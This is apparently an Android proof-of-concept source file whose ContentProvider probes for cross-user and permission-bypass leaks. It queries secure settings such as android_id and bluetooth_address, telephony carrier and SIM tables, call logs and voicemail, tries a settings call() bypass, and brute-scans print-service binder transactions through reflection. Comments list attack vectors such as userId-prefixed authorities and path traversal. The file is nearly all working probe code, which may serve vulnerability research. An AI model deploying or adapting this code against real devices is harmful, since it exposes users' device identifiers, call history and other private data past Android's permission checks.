package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class URIConfusionProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("settings")) {
            probeSettingsConfusion(cursor);
        } else if (path != null && path.contains("telephony")) {
            probeTelephonyProvider(cursor);
        } else if (path != null && path.contains("calllog")) {
            probeCallLog(cursor);
        } else if (path != null && path.contains("print")) {
            probePrintService(cursor);
        } else if (path != null && path.contains("voicemail")) {
            probeVoicemail(cursor);
        } else {
            probeSettingsConfusion(cursor);
            probeTelephonyProvider(cursor);
            probeCallLog(cursor);
            probePrintService(cursor);
            probeVoicemail(cursor);
        }

        return cursor;
    }

    private void probeSettingsConfusion(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Settings provider cross-user attack vectors:
        // 1. Authority with userId prefix: content://11@settings/secure/android_id
        // 2. Path traversal: content://settings/secure/../system/secure_key
        // 3. call() method with user override
        // 4. Special keys that leak cross-user info

        // Test: query Settings.Global for device-wide secrets
        String[] globalKeys = {"device_provisioned", "adb_enabled", "development_settings_enabled",
            "wifi_networks_available_notification_on", "bluetooth_on",
            "install_non_market_apps", "usb_mass_storage_enabled",
            "package_verifier_user_consent", "device_name"};

        for (String key : globalKeys) {
            try {
                Uri u = Uri.parse("content://settings/global/" + key);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(c.getColumnIndex("value"));
                    cursor.addRow(new Object[]{"global_" + key, val != null ? val : "null"});
                    c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"global_" + key, "ERR:" + truncate(e.getMessage())});
            }
        }

        // Test: query Settings.Secure for sensitive data
        String[] secureKeys = {"bluetooth_address", "enabled_input_methods",
            "default_input_method", "enabled_accessibility_services",
            "install_non_market_apps", "android_id",
            "always_on_vpn_app", "always_on_vpn_lockdown",
            "autofill_service", "credential_service",
            "selected_spell_checker", "enabled_notification_listeners",
            "enabled_notification_policy_access_packages"};

        for (String key : secureKeys) {
            try {
                Uri u = Uri.parse("content://settings/secure/" + key);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(c.getColumnIndex("value"));
                    if (val != null && !val.isEmpty()) {
                        cursor.addRow(new Object[]{"secure_" + key, truncate(val)});
                    }
                    c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"secure_" + key, "ERR:" + truncate(e.getMessage())});
            }
        }

        // Test: ContentResolver.call() bypass attempts
        try {
            Bundle b = cr.call(Uri.parse("content://settings/secure"),
                "GET_secure", "android_id", null);
            if (b != null) {
                String val = b.getString("value");
                cursor.addRow(new Object[]{"call_androidid", val != null ? val : "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"call_androidid", "ERR:" + truncate(e.getMessage())});
        }

        // Test: list all Settings via query with null selection
        try {
            Uri u = Uri.parse("content://settings/secure");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"secure_all", "count=" + c.getCount()});
                while (c.moveToNext() && c.getPosition() < 5) {
                    try {
                        String name = c.getString(c.getColumnIndex("name"));
                        String val = c.getString(c.getColumnIndex("value"));
                        cursor.addRow(new Object[]{"sec_" + c.getPosition(),
                            name + "=" + (val != null ? truncate(val) : "null")});
                    } catch (Exception ignored) {}
                }
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"secure_all", "ERR:" + truncate(e.getMessage())});
        }

        // Test: System settings
        try {
            Uri u = Uri.parse("content://settings/system");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"system_all", "count=" + c.getCount()});
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"system_all", "ERR:" + truncate(e.getMessage())});
        }
    }

    private void probeTelephonyProvider(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Telephony provider - APN data, carrier info
        String[] uris = {
            "content://telephony/carriers",
            "content://telephony/carriers/current",
            "content://telephony/carriers/preferapn",
            "content://telephony/siminfo",
        };

        for (String uriStr : uris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    if (count > 0) {
                        StringBuilder sb = new StringBuilder("count=" + count + " cols=[");
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            sb.append(c.getColumnName(i));
                            if (i < 4) sb.append(",");
                        }
                        sb.append("]");
                        cursor.addRow(new Object[]{"tel_" + u.getLastPathSegment(), sb.toString()});

                        if (c.moveToFirst()) {
                            StringBuilder row = new StringBuilder();
                            for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                                try {
                                    String val = c.getString(i);
                                    row.append(c.getColumnName(i)).append("=").append(val != null ? val : "null").append("|");
                                } catch (Exception ignored) {}
                            }
                            cursor.addRow(new Object[]{"tel_data", truncate(row.toString())});
                        }
                    } else {
                        cursor.addRow(new Object[]{"tel_" + u.getLastPathSegment(), "count=0"});
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"tel_" + Uri.parse(uriStr).getLastPathSegment(), "DENIED"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"tel_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }
    }

    private void probeCallLog(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Call log provider
        String[] uris = {
            "content://call_log/calls",
            "content://call_log/calls/filter",
            "content://call_log/voicemails",
        };

        for (String uriStr : uris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    if (count > 0) {
                        cursor.addRow(new Object[]{"calllog_" + u.getLastPathSegment(),
                            "ACCESSIBLE! count=" + count});
                    } else {
                        cursor.addRow(new Object[]{"calllog_" + u.getLastPathSegment(), "count=0"});
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"calllog_" + Uri.parse(uriStr).getLastPathSegment(), "DENIED"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"calllog_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }
    }

    private void probePrintService(MatrixCursor cursor) {
        // Print spooler service - might leak document info
        IBinder binder = getServiceBinder("print");
        if (binder == null) { cursor.addRow(new Object[]{"print", "no_binder"}); return; }
        String desc = "android.print.IPrintManager";

        // IPrintManager TX scan
        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0); // userId
                data.writeString(getContext().getPackageName());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"print_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        // skip
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"print_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeVoicemail(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        String[] uris = {
            "content://com.android.voicemail/voicemail",
            "content://com.android.voicemail/status",
        };

        for (String uriStr : uris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    cursor.addRow(new Object[]{"vm_" + u.getLastPathSegment(),
                        count > 0 ? "ACCESSIBLE! count=" + count : "count=0"});
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"vm_" + Uri.parse(uriStr).getLastPathSegment(), "DENIED"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"vm_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
